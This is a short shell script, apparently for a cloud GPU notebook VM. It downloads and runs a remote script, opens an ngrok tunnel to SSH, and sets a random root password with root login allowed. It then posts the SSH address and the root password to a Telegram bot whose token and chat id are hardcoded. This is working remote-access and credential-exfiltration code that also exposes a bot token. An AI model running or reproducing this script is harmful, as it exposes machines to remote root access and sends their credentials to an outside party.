rm -rf ngrok ngrok.zip main.sh > /dev/null 2>&1
wget -O ng.sh https://raw.githubusercontent.com/vry33/ssh/main/ngrok_v2/get_ngrok.sh > /dev/null 2>&1
chmod +x ng.sh
./ng.sh $1
clear
./ngrok tcp 22 &>/dev/null &
echo "======================="
echo Updating Please Wait
echo "======================="
sudo apt update > /dev/null 2>&1
apt-get install jq
apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null

insta=$(</dev/urandom tr -dc _A-Z-a-z-0-9 | head -c12)
echo root:$insta | chpasswd
mkdir -p /var/run/sshd
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc
echo "export LD_LIBRARY_PATH" >> /root/.bashrc
nohup /usr/sbin/sshd -D > sshd_log.out &

url=$(curl "http://localhost:4040/api/tunnels" | jq '.tunnels[0].public_url' | cut -d'"' -f2)
host=$(echo $url | sed 's\:[0-9].*\\g' | sed 's\tcp://\\g')
port=$(echo $url | sed 's\.*io:\\g')
echo "ssh -p${port} root@${host}"
echo $insta
curl -s "https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text=ssh -p${port} root@${host}"
curl -s "https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text=$insta"
